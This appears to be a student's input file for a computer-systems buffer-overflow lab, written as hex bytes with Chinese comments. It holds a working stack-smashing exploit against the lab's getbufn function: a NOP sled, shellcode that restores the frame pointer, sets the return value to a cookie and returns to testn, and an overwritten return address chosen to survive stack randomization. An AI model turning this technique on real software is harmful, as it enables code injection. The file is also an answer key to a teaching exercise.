/* 由于将返回地址固定覆写为 0x55682fd8(0x556831e0-0x208 , getbufn 栈帧随机值中的最大值) */
/* 此 180 个 nop 指令， 可以确保当 为 getbufn 分配的栈帧地址在较小的低地址时,不会产生额外的汇编指令 */
/* 防止其影响真正攻击指令的效果 */
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
/* 真正的攻击指令永远在 0x55682fd8(0x556831e0-0x208, getbufn 栈帧随机值中的最大值)开始执行 */
/* ; 恢复旧%ebp值 */
/* ; 由于 旧%ebp值(testn 栈底) 恒为 新%ebp值(getbufn 栈底)+0x30. */
/* ; 故, 可通过当前 %esp 所指位置，计算出 testn 的栈底地址 */
/* lea 0x28(%esp), %ebp */
/* ; 设置返回值为 cookie */
/* movl $0x6898ac90, %eax */
/* ; 设置正常的返回地址 */
/* pushl $0x08048e15 */
/* ; 返回至 testn 函数 */
/* ret */
8d 6c 24 28
b8 90 ac 98
68 68 15 8e
04 08 c3 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
d8 2f 68 55
